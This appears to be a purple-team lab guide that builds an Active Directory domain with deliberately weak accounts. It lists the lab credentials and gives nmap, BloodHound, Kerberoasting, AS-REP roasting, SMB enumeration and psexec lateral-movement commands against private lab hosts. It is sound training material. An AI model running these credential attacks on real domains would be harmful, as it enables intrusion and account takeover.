# Phase 3 — Active Directory Domain

This phase adds a Windows Server 2022 domain controller and a Windows 10 domain client to the lab.

## Network topology

| Segment       | Gateway      | Hosts                                           |
|---------------|--------------|-------------------------------------------------|
| Lab-Internal  | 10.10.0.2    | Kali (10.10.0.10), SIEM/Wazuh (10.10.0.30)     |
| TargetNet     | 10.20.0.2    | Juice Shop (10.20.0.20)                         |
| ADNet         | 10.30.0.2    | DC01 (10.30.0.10), Win10-1 (10.30.0.11)         |

The `lab-router` VM connects all three segments and performs NAT/MASQUERADE for outbound traffic.

## Credentials

| System        | Account                 | Password          | Notes                              |
|---------------|-------------------------|-------------------|------------------------------------|
| DC01 / Win10  | `vagrant` (local)       | `vagrant`         | Vagrant box default                |
| Domain admin  | `purple.lab\vagrant`    | `vagrant`         | Added to Domain Admins during step 2 |
| DSRM          | n/a                     | `P@ssw0rd1234!`   | Directory Services Restore Mode      |
| alice         | `purple.lab\alice`      | `Password123!`    | Domain Admin (intentional weakness)  |
| bob           | `purple.lab\bob`        | `Summer2024!`     | AS-REP roastable (no pre-auth)      |
| carol         | `purple.lab\carol`      | `Password123!`    | Regular user, password reuse        |
| svc_sql       | `purple.lab\svc_sql`    | `SqlSvc123!`      | Service account with SPN (Kerberoast) |
| svc_web       | `purple.lab\svc_web`    | `WebSvc2024!`     | Service account (no delegation enabled) |

## Built-in attack paths / purple-team scenarios

1. **Reconnaissance**  
   From Kali: `nmap -sV -Pn 10.30.0.10` and `nmap -sV -Pn 10.30.0.11`  
   Expected open ports: 53, 88, 135, 139, 445, 389, 636, 3268, 3389, etc.

2. **Kerberoasting**  
   `bloodhound.py -d purple.lab -u alice -p 'Password123!' -dc dc01.purple.lab -c All`  
   `GetUserSPNs.py purple.lab/alice:Password123! -dc-ip 10.30.0.10 -request`

3. **AS-REP roasting**  
   `GetNPUsers.py purple.lab/bob:Summer2024! -dc-ip 10.30.0.10 -no-pass`

4. **SMB share enumeration**  
   `netexec smb 10.30.0.10 -u alice -p 'Password123!'`  
   `smbclient -L //10.30.0.10 -U purple.lab\alice`

5. **Credential abuse / lateral movement**  
   Use `alice` Domain Admin credentials with `psexec.py`, `wmiexec.py`, or `crackmapexec` against Win10-1.

6. **BloodHound analysis**  
   Ingest the collected JSON and look for shortest paths to Domain Admins.

## Wazuh visibility

Both Windows endpoints install the Wazuh agent version `4.10.1` and report to `10.10.0.30`.  
Verify from the SIEM: `docker exec single-node_wazuh.manager_1 /var/ossec/bin/agent_control -l`

## Snapshots

After verifying Phase 3, take a clean snapshot of every VM:

```bash
vagrant snapshot save dc clean-phase3
vagrant snapshot save win10 clean-phase3
vagrant snapshot save router clean-phase3
vagrant snapshot save siem clean-phase3
vagrant snapshot save kali clean-phase3
vagrant snapshot save target clean-phase3
```
